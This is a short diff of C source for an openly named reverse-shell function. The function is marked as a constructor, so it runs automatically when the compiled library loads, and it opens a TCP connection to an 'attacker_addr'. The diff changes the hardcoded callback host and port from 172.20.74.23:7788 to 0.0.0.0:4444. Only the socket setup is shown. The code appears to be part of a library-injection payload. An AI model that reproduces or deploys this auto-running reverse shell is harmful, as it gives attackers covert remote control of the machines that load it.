@@ -8,8 +8,8 @@
 
 __attribute__((constructor)) static void reverse_shell(void)
 {
-    char *server_ip="172.20.74.23";
-    uint32_t server_port=7788;
+    char *server_ip="0.0.0.0";
+    uint32_t server_port=4444;
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in attacker_addr = {0};
     attacker_addr.sin_family = AF_INET;
